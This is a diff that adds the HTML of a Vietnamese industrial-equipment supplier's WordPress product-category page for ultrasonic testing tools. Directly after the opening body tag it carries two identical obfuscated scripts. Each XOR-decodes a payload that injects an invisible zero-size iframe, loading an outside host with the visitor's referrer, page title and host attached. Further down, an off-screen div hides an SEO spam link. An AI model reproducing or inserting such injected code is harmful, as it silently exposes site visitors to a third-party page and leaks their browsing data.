@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>  Dụng cụ đo kiểm tra bằng siêu âm | An Pha Nam</title>
+
+
+
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>
+    <link href="http://anphanam.vn/data/wp-content/themes/anphanam/Styles/layout.css" rel="stylesheet" type="text/css" />
+    <link href="http://anphanam.vn/data/wp-content/themes/anphanam/Styles/nivo-slider.css" rel="stylesheet" type="text/css" />
+    <link href="http://anphanam.vn/data/wp-content/themes/anphanam/Styles/nivo-style.css" rel="stylesheet" type="text/css" />
+	
+	<link rel="stylesheet" href="http://anphanam.vn/data/wp-content/themes/anphanam/css/style-menu.css" type="text/css"/>	
+	<script type="text/javascript" language="javascript" src="http://anphanam.vn/data/wp-content/themes/anphanam/js/jquery.dropdownPlain.js"></script>
+	
+    <script type="text/javascript" src="http://anphanam.vn/data/wp-content/themes/anphanam/Scripts/jquery.nivo.slider.pack.js"></script>
+    <script src="http://anphanam.vn/data/wp-content/themes/anphanam/Scripts/jquery.carouFredSel-5.6.1.js" type="text/javascript"></script>
+    <script src="http://anphanam.vn/data/wp-content/themes/anphanam/Scripts/jquery.carouFredSel-5.6.1-packed.js" type="text/javascript"></script>
+    <!--Javascript cho slide anh-->
+    <script type="text/javascript">
+            $(window).load(function() {
+                $('#slider').nivoSlider({
+                    effect: 'random',
+                    slices:8,
+                    animSpeed:900, //Slide transition speed
+                    pauseTime:3000,
+                    startSlide:0, //Set starting Slide (0 index)
+                    directionNav:true //Next & Prev
+                });
+            });
+     </script>
+     
+     <script type="text/javascript" language="javascript">
+         $(function () {
+
+             //	Basic carousel, no options
+             $('#foo0').carouFredSel({
+                prev: '#prev2',
+				next: '#next2'
+             });
+         });
+     </script>
+<link rel="alternate" type="application/rss+xml" title="An Pha Nam RSS Feed" href="http://anphanam.vn/data/?feed=rss2&amp;lang=en" />
+<link rel="alternate" type="application/atom+xml" title="An Pha Nam Atom Feed" href="http://anphanam.vn/data/?feed=atom&amp;lang=en" />
+<link rel="pingback" href="http://anphanam.vn/data/xmlrpc.php?lang=en" />
+
+
+
+<link rel="alternate" type="application/rss+xml" title="An Pha Nam &raquo; Feed" href="http://anphanam.vn/data/?feed=rss2&amp;lang=en" />
+<link rel="alternate" type="application/rss+xml" title="An Pha Nam &raquo; Comments Feed" href="http://anphanam.vn/data/?feed=comments-rss2&amp;lang=en" />
+		<link rel="stylesheet" href="http://anphanam.vn/data/wp-content/themes/anphanam/style-.css" type="text/css" media="screen" />
+	<meta content="anphanam v.2.9" name="generator"/><link media="screen" type="text/css" href="http://anphanam.vn/data/wp-content/themes/anphanam/epanel/page_templates/js/fancybox/jquery.fancybox-1.3.4.css" rel="stylesheet" />
+<link media="screen" type="text/css" href="http://anphanam.vn/data/wp-content/themes/anphanam/epanel/page_templates/page_templates.css" rel="stylesheet" /><link rel='stylesheet' id='et-shortcodes-css-css'  href='http://anphanam.vn/data/wp-content/themes/anphanam/epanel/shortcodes/shortcodes.css?ver=1.8' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-pagenavi-css'  href='http://anphanam.vn/data/wp-content/plugins/wp-pagenavi/pagenavi-css.css?ver=2.70' type='text/css' media='all' />
+<script type='text/javascript' src='http://anphanam.vn/data/wp-includes/js/jquery/jquery.js?ver=1.8.3'></script>
+<script type='text/javascript' src='http://anphanam.vn/data/wp-content/themes/anphanam/epanel/shortcodes/js/et_shortcodes_frontend.js?ver=1.8'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://anphanam.vn/data/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://anphanam.vn/data/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.5.2" />
+
+<meta http-equiv="Content-Language" content="en-US" />
+<style type="text/css" media="screen">
+.qtrans_flag span { display:none }
+.qtrans_flag { height:12px; width:18px; display:block }
+.qtrans_flag_and_text { padding-left:20px }
+.qtrans_flag_vi { background:url(http://anphanam.vn/data/wp-content/plugins/qtranslate/flags/vn.png) no-repeat }
+.qtrans_flag_en { background:url(http://anphanam.vn/data/wp-content/plugins/qtranslate/flags/gb.png) no-repeat }
+</style>
+<link hreflang="vi" href="http://anphanam.vn/data/?danhmuc=dung-cu-do-kiem-tra-bang-sieu-am&amp;lang=vi" rel="alternate" />
+  
+   
+
+</head><body>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<div  style="position: absolute;display:block; text-indent:-0px; top: -200px; overflow: auto">tim mot dia chi <em><a rel="dofollow" href="http://myhost.vn/"  title="thue vps gia re">thue vps gia re</a> uy tin</em></div>
+   <div id="container">
+            <div id="header">
+                 <div id="logo"><a href="http://anphanam.vn/data/?lang=en">
+  <img width="198px" height="129px" src="http://anphanam.vn/data/wp-content/uploads/2013/08/logo_new.png"></a>
+ </div><!--End logo-->
+            <div id="menu">
+                <div id="box-search">
+                    <div id="text-search">
+                    
+<form action="http://anphanam.vn/data/?lang=en" method="get">	
+
+					 
+		
+			<div id="text"><input onblur="if (this.value == '') {this.value = ' Press Keyword		';}" onfocus="if (this.value == 'Press Keyword') {this.value = '';}" id="s" name="s" value="Press Keyword"
+		name="s" type="text" id="txtSearch" style="width: 205px; height: 29px;
+							background-color: #282828;
+                                border: none; color: white;" />
+                        </div>
+                        <input type="image" id="btnSearch" value="Tìm"
+						src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/btnTim.png"
+						style="width: 30px;
+                            height: 25px; background-color: #171717; color: white; border: none; 
+							font-family: Arial,Tahoma;
+                            font-size: 12px; font-weight: bold; float: left; margin: 3px 2px 3px 5px;" />
+							
+						                    
+</form><div style="margin:-12px">
+				 		
+					</div>	
+				 		
+						<!--	
+                        <input type="image" id="vi-flag" 
+						src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/vi-flag.png"
+						style="float: left;
+                            margin: 6px 2px;" />
+                        <input type="image" id="en-flag"
+						src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/en-flag.png" style="float: left;
+                            margin: 6px 2px;" />-->
+                    </div><!--End text-search-->
+                </div><!--End box-search-->
+                <div id="box-menu">
+					 <ul id="menu-header" class="dropdown"><li id="menu-item-56" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-56"><a href="http://anphanam.vn/data">Trang chủ</a></li>
+<li id="menu-item-57" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-57"><a href="http://anphanam.vn/data/?page_id=18&amp;lang=en">partner</a></li>
+<li id="menu-item-60" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-60"><a href="http://anphanam.vn/data/?page_id=55&amp;lang=en">(Tiếng Việt) Hệ thống công ty</a></li>
+<li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="http://anphanam.vn/data/?page_id=54&amp;lang=en">Contact</a></li>
+<li id="menu-item-40" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor menu-item-40"><a href="#">Sản phẩm</a>
+<ul class="sub-menu">
+	<li id="menu-item-36" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-36"><a href="http://anphanam.vn/data/?danhmuc=vat-tu-cat-mai&amp;lang=en">Vật tư cắt mài</a>
+	<ul class="sub-menu">
+		<li id="menu-item-143" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-143"><a href="http://anphanam.vn/data/?danhmuc=mui-taro&amp;lang=en">Mũi Taro</a></li>
+		<li id="menu-item-145" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-145"><a href="http://anphanam.vn/data/?danhmuc=nhap-mai&amp;lang=en">Nháp mài</a></li>
+		<li id="menu-item-147" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-147"><a href="http://anphanam.vn/data/?danhmuc=sap-mai-cat-mai&amp;lang=en">Sáp mài, cát mài</a></li>
+		<li id="menu-item-141" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-141"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-khoan-cat&amp;lang=en">Dụng cụ khoan cắt</a></li>
+		<li id="menu-item-139" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-139"><a href="http://anphanam.vn/data/?danhmuc=bi-inox-bi-thep-vat-tu-cat-mai&amp;lang=en">Bi inox, bi thép</a></li>
+		<li id="menu-item-166" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-166"><a href="http://anphanam.vn/data/?danhmuc=da-cat-da-mai&amp;lang=en">Đá cắt, đá mài</a></li>
+	</ul>
+</li>
+	<li id="menu-item-91" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-91"><a href="http://anphanam.vn/data/?danhmuc=motor-hop-so-bom-cong-nghiep&amp;lang=en">Motor, hộp số, bơm công nghiệp</a>
+	<ul class="sub-menu">
+		<li id="menu-item-93" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-93"><a href="http://anphanam.vn/data/?danhmuc=bom-cong-nghiep&amp;lang=en">Bơm công nghiệp</a></li>
+		<li id="menu-item-95" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-95"><a href="http://anphanam.vn/data/?danhmuc=hop-so&amp;lang=en">Hộp số</a></li>
+		<li id="menu-item-97" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-97"><a href="http://anphanam.vn/data/?danhmuc=motor&amp;lang=en">Motor</a></li>
+	</ul>
+</li>
+	<li id="menu-item-129" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-129"><a href="http://anphanam.vn/data/?danhmuc=thiet-bi-thuy-luc-khi-nen&amp;lang=en">Thiết bị thủy lực -khí nén</a>
+	<ul class="sub-menu">
+		<li id="menu-item-131" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-131"><a href="http://anphanam.vn/data/?danhmuc=khi-nen&amp;lang=en">Khí nén</a></li>
+		<li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-133"><a href="http://anphanam.vn/data/?danhmuc=thuy-luc&amp;lang=en">Thủy lực</a></li>
+	</ul>
+</li>
+	<li id="menu-item-63" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-63"><a href="http://anphanam.vn/data/?danhmuc=cam-kep-banh-xe&amp;lang=en">Cam kẹp, bánh xe</a>
+	<ul class="sub-menu">
+		<li id="menu-item-64" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-64"><a href="http://anphanam.vn/data/?danhmuc=banh-xe&amp;lang=en">Bánh xe</a></li>
+		<li id="menu-item-66" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-66"><a href="http://anphanam.vn/data/?danhmuc=cam-kep&amp;lang=en">Cam kẹp</a></li>
+	</ul>
+</li>
+	<li id="menu-item-72" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc current-danhmuc-ancestor current-menu-ancestor current-menu-parent current-danhmuc-parent menu-item-72"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-do-kiem-tra&amp;lang=en">Dụng cụ đo kiểm tra</a>
+	<ul class="sub-menu">
+		<li id="menu-item-75" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-75"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-do-co-dien-tu&amp;lang=en">Dụng cụ đo cơ- điện tử</a></li>
+		<li id="menu-item-77" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc current-menu-item menu-item-77"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-do-kiem-tra-bang-sieu-am&amp;lang=en">Dụng cụ đo kiểm tra bằng siêu âm</a></li>
+		<li id="menu-item-79" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-79"><a href="http://anphanam.vn/data/?danhmuc=may-do-khong-gian-ba-chieu&amp;lang=en">Máy đo không gian ba chiều</a></li>
+	</ul>
+</li>
+	<li id="menu-item-67" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-67"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay&amp;lang=en">Dụng cụ cầm tay</a>
+	<ul class="sub-menu">
+		<li id="menu-item-68" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-68"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay-dung-khi-nen&amp;lang=en">Dụng cụ cầm tay dùng khí nén</a></li>
+		<li id="menu-item-69" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-69"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay-dung-dien&amp;lang=en">Dụng cụ cầm tay dùng điện</a></li>
+		<li id="menu-item-71" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-71"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay-khac&amp;lang=en">Dụng cụ cầm tay khác</a></li>
+	</ul>
+</li>
+	<li id="menu-item-83" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-83"><a href="http://anphanam.vn/data/?danhmuc=may-gia-cong-chuyen-dung&amp;lang=en">Máy gia công chuyên dụng</a></li>
+	<li id="menu-item-103" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-103"><a href="http://anphanam.vn/data/?danhmuc=brushless-motors&amp;lang=en">Brushless Motors</a></li>
+	<li id="menu-item-105" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-105"><a href="http://anphanam.vn/data/?danhmuc=quat-lam-mat-cooling-fans&amp;lang=en">Quạt làm mát – Cooling Fans</a></li>
+	<li id="menu-item-113" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-113"><a href="http://anphanam.vn/data/?danhmuc=thiet-bi-cong-nghiep-khac&amp;lang=en">Thiết bị công nghiệp khác</a>
+	<ul class="sub-menu">
+		<li id="menu-item-115" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-115"><a href="http://anphanam.vn/data/?danhmuc=day-dai&amp;lang=en">Dây đai</a></li>
+		<li id="menu-item-117" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-117"><a href="http://anphanam.vn/data/?danhmuc=vong-bi&amp;lang=en">Vòng bi</a></li>
+	</ul>
+</li>
+	<li id="menu-item-119" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-119"><a href="http://anphanam.vn/data/?danhmuc=thiet-bi-han&amp;lang=en">Thiết bị hàn</a>
+	<ul class="sub-menu">
+		<li id="menu-item-121" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-121"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-bao-ho-han&amp;lang=en">Dụng cụ bảo hộ hàn</a></li>
+		<li id="menu-item-123" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-123"><a href="http://anphanam.vn/data/?danhmuc=may-han&amp;lang=en">Máy hàn</a></li>
+		<li id="menu-item-125" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-125"><a href="http://anphanam.vn/data/?danhmuc=phu-kien-han&amp;lang=en">Phụ kiện hàn</a></li>
+		<li id="menu-item-127" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-127"><a href="http://anphanam.vn/data/?danhmuc=vat-tu-han&amp;lang=en">Vật tư hàn</a></li>
+	</ul>
+</li>
+	<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-135"><a href="http://anphanam.vn/data/?danhmuc=thiet-ke-che-tao-gia-cong-co-khi&amp;lang=en">Thiết kế chế tạo, gia công cơ khí</a></li>
+	<li id="menu-item-78" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-78"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay&amp;lang=en">Dụng cụ cầm tay</a>
+	<ul class="sub-menu">
+		<li id="menu-item-80" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-80"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay-dung-khi-nen&amp;lang=en">Dụng cụ cầm tay dùng khí nén</a>
+		<ul class="sub-menu">
+			<li id="menu-item-70" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-70"><a href="http://anphanam.vn/data/?danhmuc=cam-kep-banh-xe&amp;lang=en">Cam kẹp, bánh xe</a>
+			<ul class="sub-menu">
+				<li id="menu-item-73" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-73"><a href="http://anphanam.vn/data/?danhmuc=banh-xe&amp;lang=en">Bánh xe</a></li>
+				<li id="menu-item-74" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-74"><a href="http://anphanam.vn/data/?danhmuc=banh-xe-cam-kep-banh-xe&amp;lang=en">Bánh xe</a></li>
+				<li id="menu-item-76" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-76"><a href="http://anphanam.vn/data/?danhmuc=cam-kep&amp;lang=en">Cam kẹp</a></li>
+			</ul>
+</li>
+		</ul>
+</li>
+		<li id="menu-item-82" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-82"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay-dung-dien&amp;lang=en">Dụng cụ cầm tay dùng điện</a></li>
+		<li id="menu-item-84" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-84"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-cam-tay-khac&amp;lang=en">Dụng cụ cầm tay khác</a></li>
+	</ul>
+</li>
+	<li id="menu-item-86" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc current-danhmuc-ancestor current-menu-ancestor current-menu-parent current-danhmuc-parent menu-item-86"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-do-kiem-tra&amp;lang=en">Dụng cụ đo kiểm tra</a>
+	<ul class="sub-menu">
+		<li id="menu-item-88" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-88"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-do-co-dien-tu&amp;lang=en">Dụng cụ đo cơ- điện tử</a></li>
+		<li id="menu-item-90" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc current-menu-item menu-item-90"><a href="http://anphanam.vn/data/?danhmuc=dung-cu-do-kiem-tra-bang-sieu-am&amp;lang=en">Dụng cụ đo kiểm tra bằng siêu âm</a></li>
+		<li id="menu-item-92" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-92"><a href="http://anphanam.vn/data/?danhmuc=may-do-khong-gian-ba-chieu&amp;lang=en">Máy đo không gian ba chiều</a></li>
+	</ul>
+</li>
+	<li id="menu-item-96" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-96"><a href="http://anphanam.vn/data/?danhmuc=may-gia-cong-chuyen-dung&amp;lang=en">Máy gia công chuyên dụng</a></li>
+	<li id="menu-item-104" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-104"><a href="http://anphanam.vn/data/?danhmuc=motor-hop-so-bom-cong-nghiep&amp;lang=en">Motor, hộp số, bơm công nghiệp</a>
+	<ul class="sub-menu">
+		<li id="menu-item-106" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-106"><a href="http://anphanam.vn/data/?danhmuc=bom-cong-nghiep&amp;lang=en">Bơm công nghiệp</a></li>
+		<li id="menu-item-108" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-108"><a href="http://anphanam.vn/data/?danhmuc=hop-so&amp;lang=en">Hộp số</a></li>
+		<li id="menu-item-110" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-110"><a href="http://anphanam.vn/data/?danhmuc=motor&amp;lang=en">Motor</a></li>
+	</ul>
+</li>
+	<li id="menu-item-112" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-112"><a href="http://anphanam.vn/data/?danhmuc=orientalmotor&amp;lang=en">Orientalmotor</a>
+	<ul class="sub-menu">
+		<li id="menu-item-116" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-116"><a href="http://anphanam.vn/data/?danhmuc=brushless-motors&amp;lang=en">Brushless Motors</a></li>
+		<li id="menu-item-114" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-114"><a href="http://anphanam.vn/data/?danhmuc=bo-tro-dong-linear-rotary-actuators&amp;lang=en">Bộ trợ động – Linear &#038; Rotary Actuators</a></li>
+		<li id="menu-item-118" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-118"><a href="http://anphanam.vn/data/?danhmuc=quat-lam-mat-cooling-fans&amp;lang=en">Quạt làm mát – Cooling Fans</a></li>
+		<li id="menu-item-163" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-163"><a href="http://anphanam.vn/data/?danhmuc=dong-co-servo-servo-motors&amp;lang=en">Đông cơ Servo- Servo Motors</a></li>
+		<li id="menu-item-164" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-164"><a href="http://anphanam.vn/data/?danhmuc=dong-co-ac-ac-motors-gearmotors&amp;lang=en">Động cơ AC – AC Motors &#038; Gearmotors</a></li>
+		<li id="menu-item-165" class="menu-item menu-item-type-taxonomy menu-item-object-danhmuc menu-item-165"><a href="http://anphanam.vn/data/?danhmuc=dong-co-buoc-stepping-motors&amp;lang=en">Động cơ bước – Stepping Motors</a></li>
+	</ul>
+</li>
+</ul>
+</li>
+</ul>                </div><!--End menu-->
+            </div><!--End menu-->
+        </div><!--End header-->        <div class="sitemap">
+            <p><!-- Breadcrumb NavXT 4.4.0 -->
+<a title="Go to An Pha Nam." href="http://anphanam.vn/data" class="home">An Pha Nam</a> » <a title="Go to Sản Phẩm." href="http://anphanam.vn/data/?post_type=sanpham">Sản Phẩm</a> » <a title="Go to the Dụng cụ đo kiểm tra Category archives." href="http://anphanam.vn/data/?danhmuc=dung-cu-do-kiem-tra&#038;lang=en">Dụng cụ đo kiểm tra</a> » Dụng cụ đo kiểm tra bằng siêu âm</p>
+        </div>
+        <div class="clearfix"></div>
+        <div id="main">
+            <div class="box-mainleft">
+                <div id="main-left">
+                    <div class="box-pro">
+             
+    
+         
+ 
+						
+						
+                    </div><!--End box-pro-->
+                    <div class="paging">
+                    </div><!--End paging-->
+                </div><!--End main-left-->
+                <div id="partner">
+                    <div class="button2">
+                        <a id="prev2" href="#"><img src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/pre.png"/></a>
+                    </div><!--End footer-->
+                    <div class="list_carousel">
+				        <ul id="foo0">
+					   
+														        </ul>
+                    </div><!--End list_carousel-->
+                    <div class="button2">
+                        <a id="next2" href="#"><img src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/next.png"/></a>
+                    </div><!--End footer-->
+                </div>
+                <div class="clearfix"></div>
+                <div class="thanhngang">
+                </div>
+            </div><!--End boxmain-left-->
+            <div id="main-right">
+                    <div class="news-support">
+                        <div class="title">
+                            <p class="abc">Online Suport							</p>
+                        </div>
+                        <div class="inside">
+                    <div style="width:199px;height: 13px; margin:15px 0px 0px 13px;clear: both;float: left">
+                        <img src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/mobile.png" style="float: left; width: 8px; height: 15px; margin: 0px 3px 0px -3px;"/>
+                        <p  class="inside-text2">Please call to best suports						</p>
+                    </div>
+                  
+ <div style="width:183px;height: 90px; margin:5px 7px;clear: both;float: left;">
+                        <div class="yahoo">
+                            <div class="column1">
+                                <div style="width:75px;height: 30px;margin-top: 10px">
+                                    <p class="inside-text1">Mr.Vụ</p>
+                                    <p class="inside-text2">01649543156</p>
+                                </div>
+                                    <div style="width:75px;height: 30px;margin-top: 10px">
+                                   <p class="inside-text1">Mr.Quân</p>
+                                    <p class="inside-text2">0946332225</p>
+                                </div>
+
+                            </div><!--End colum1-->
+                            <div class="column2">
+                                <a class="imgyahoo" href="ymsgr:sendIM?haycuoilen_bg@yahoo.com">
+								<img src="http://presence.msg.yahoo.com/online?u=haycuoilen_bg@yahoo.com&m=g&t="/></a>
+                                <a class="imgyahoo" href="ymsgr:sendIM?minhquan_kbs">
+								<img src="http://presence.msg.yahoo.com/online?u=minhquan_kbs&m=g&t="/></a>     </div><!--End column2-->
+                               
+                        </div>
+                        <div class="yahoo">
+                            <div class="column1">
+						
+                                <div style="width:75px;height: 30px;margin-top: 10px">
+                                    <p class="inside-text1"></p>
+                                    <p class="inside-text2"></p>
+                                </div>
+                                    <div style="width:75px;height: 30px;margin-top: 10px">
+                                    <p class="inside-text1"></p>
+                                    <p class="inside-text2"></p>
+                                </div>
+                            </div><!--End colum1-->
+						
+							
+                            <div class="column2">
+                              <a class="imgyahoo" href="ymsgr:sendIM?topweb">
+								<img src="http://presence.msg.yahoo.com/online?u=topweb&m=g&t="/></a>
+                                <a class="imgyahoo" href="ymsgr:sendIM?">
+								<img src="http://presence.msg.yahoo.com/online?u=&m=g&t="/></a>  </div>
+                    </div>
+					
+					
+					
+                        
+                    <div style="width:183px;height: 50px; margin:5px 0px;clear: both;float: left;">
+                        <p style="width:60px;display: block;float: left;color: red;font-weight: bold;font-size: 15px;font-family:Arial,Tahoma; text-align: center;margin: 13px 0px">Góp ý:</p>
+                        <div style="width:120px;height: 48px;float: right">
+                            <div style="width:120px;height: 24px;float: right;clear: both;">
+                                <img style="margin: 5px auto;float: left" src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/email.png"/>
+                                <a style="text-decoration: none;color: gray;font-weight: 
+								bold;font-size: 12px;font-family:Arial,Tahoma;float: right;display: block;margin-top: 6px" href="mailto:sales10.apn@gmail.com">Gửi thư góp ý</a>
+                            </div>
+                                <div style="width:120px;height: 24px;float: right">
+                                <img style="margin: 5px auto;float: left" src="http://anphanam.vn/data/wp-content/themes/anphanam/Uploads/images/phone.png"/>
+                                <a style="text-decoration: none;color: gray;font-weight: bold;font-size: 12px;font-family:Arial,Tahoma;float: right;display: block;margin-top: 6px">(04) 38726916</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                    </div><!--End news-support--><br>
+                    <div class="news-support">
+                <div class="title">
+                    <p class="abc">FEATUTED NEWS</p>
+                </div>
+                <div class="inside">
+								                        								
+					 <div class="inside-news">
